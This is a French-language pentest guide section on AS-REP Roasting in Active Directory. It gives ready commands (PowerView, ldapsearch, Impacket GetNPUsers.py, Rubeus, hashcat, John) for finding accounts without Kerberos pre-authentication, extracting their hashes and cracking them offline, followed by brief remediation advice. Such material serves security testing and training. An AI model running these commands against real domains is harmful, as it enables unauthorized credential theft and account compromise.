# III.C. AS-REP Roasting

L'AS-REP Roasting est une attaque qui cible les comptes utilisateurs pour lesquels la pré-authentification Kerberos est désactivée (attribut `DONT_REQ_PREAUTH`). Pour ces comptes, un attaquant peut demander un ticket Kerberos (AS-REP) sans fournir de mot de passe. La partie chiffrée de ce ticket peut ensuite être craquée hors ligne pour retrouver le mot de passe du compte.

## 1. Identification des Comptes Vulnérables

*   **PowerView :**
    ```powershell
    Get-DomainUser -PreauthNotRequired | select samaccountname, userprincipalname, distinguishedname
    ```
*   **Requête LDAP (ldapsearch ou ADExplorer) :**
    L'attribut `userAccountControl` contient le flag `DONT_REQ_PREAUTH` (valeur 4194304 ou 0x400000).
    ```bash
    ldapsearch -x -H ldap://<IP_DC> -D "<DN_USER_SI_AUTH>" -w "<PASSWORD_SI_AUTH>" \
               -b "<DN_BASE_DOMAINE>" \
               "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
               samaccountname userprincipalname
    # Pour une recherche anonyme (si autorisée)
    ldapsearch -x -h <IP_DC> -b "<DN_BASE_DOMAINE>" \
               "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
               samaccountname userprincipalname
    ```
*   **Impacket `GetNPUsers.py` (Linux) :**
    Cet outil peut également identifier et récupérer les hashes AS-REP.
    ```bash
    # Nécessite une liste d'utilisateurs (users.txt) ou un utilisateur cible
    # -dc-ip : IP du contrôleur de domaine
    # -request : Demande le hash si le compte est vulnérable
    # -format hashcat : Sortie au format pour Hashcat
    python GetNPUsers.py <DOMAINE.LOCAL>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip <IP_DC>
    python GetNPUsers.py <DOMAINE.LOCAL>/<utilisateur_cible> -request -format hashcat -dc-ip <IP_DC>
    ```

## 2. Récupération des Hashes AS-REP

*   **Rubeus (Windows) :**
    ```powershell
    # Pour un utilisateur spécifique
    Rubeus.exe asreproast /user:<NOM_UTILISATEUR> /domain:<DOMAINE.LOCAL> /dc:<IP_DC> /format:hashcat | Out-File -FilePath C:\temp\asrep_hashes.txt
    # Pour tous les utilisateurs vulnérables (peut être bruyant)
    # Rubeus.exe asreproast /outfile:C:\temp\asrep_hashes.txt /format:hashcat
    ```
*   **Impacket `GetNPUsers.py` (Linux) :**
    (Voir commande ci-dessus, elle récupère directement les hashes).

## 3. Craquage des Hashes AS-REP

Les hashes AS-REP sont généralement de type KRB5ASREP (mode Hashcat 18200).

*   **Hashcat :**
    ```bash
    # hashcat -m 18200 <fichier_hashes_asrep> <liste_de_mots_de_passe>
    hashcat -m 18200 asrep_hashes.txt rockyou.txt
    hashcat -m 18200 asrep_hashes.txt rockyou.txt -O # Optimisation pour mots de passe plus longs
    ```
*   **John the Ripper :**
    ```bash
    # john --format=krb5asrep --wordlist=rockyou.txt asrep_hashes.txt
    # ou pour le type 23 (plus récent)
    # john --format=krb5asrep-23 --wordlist=rockyou.txt asrep_hashes.txt
    ```

## Impact et Remédiation
*   **Impact :** Compromission de comptes utilisateurs, potentiellement des comptes de service ou privilégiés si mal configurés.
*   **Remédiation :**
    *   Activer la pré-authentification Kerberos pour tous les comptes utilisateurs (décocher "Do not require Kerberos preauthentication" dans ADUC).
    *   Utiliser des mots de passe longs et complexes pour rendre le craquage plus difficile. 